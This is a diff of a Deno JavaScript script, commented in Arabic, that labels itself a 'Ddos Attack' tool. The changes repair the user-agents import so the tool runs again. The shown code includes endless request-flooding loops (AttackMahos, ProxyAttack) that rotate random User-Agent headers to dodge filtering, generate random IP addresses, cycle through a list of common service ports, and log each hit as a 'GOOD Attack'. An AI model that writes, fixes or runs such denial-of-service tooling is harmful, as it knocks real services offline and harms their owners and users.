@@ -1,7 +1,7 @@
 // استيراد الحزم باستخدام صيغة npm:
 import TelegramBot from "npm:node-telegram-bot-api";
 import express from "npm:express";
-import { userAgents } from "npm:user-agents";
+import UserAgents from "npm:user-agents"; // تغيير هنا
 import figlet from "npm:figlet";
 
 // Colors
@@ -11,6 +11,9 @@ const S = '\x1b[1;33m';
 const B = '\x1b[38;5;208m';
 
 console.log(`${F}[✓] All libraries imported and ready to use!${Z}`);
+
+// إنشاء instance من UserAgents
+const userAgents = new UserAgents(); // تغيير هنا
 
 // Display logo
 const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
@@ -38,7 +41,7 @@ async function AttackMahos() {
             'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
             'Keep-Alive': '115',
             'Connection': 'keep-alive',
-            'User-Agent': userAgents.getRandom()
+            'User-Agent': userAgents.random().toString() // تغيير هنا
         };
         
         try {
@@ -55,7 +58,6 @@ async function AttackMahos() {
 }
 
 async function ProxyAttack() {
-    // ملاحظة: تحتاج إلى إضافة حزم إضافية للبروكسي في Deno
     while (true) {
         const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
         const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
@@ -69,11 +71,10 @@ async function ProxyAttack() {
             'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
             'Keep-Alive': '115',
             'Connection': 'keep-alive',
-            'User-Agent': userAgents.getRandom()
+            'User-Agent': userAgents.random().toString() // تغيير هنا
         };
         
         try {
-            // في Deno قد تحتاج إلى استخدام مكتبة بروكسي مختلفة
             const response = await fetch(url, { headers });
             if (response.status === 200) {
                 console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
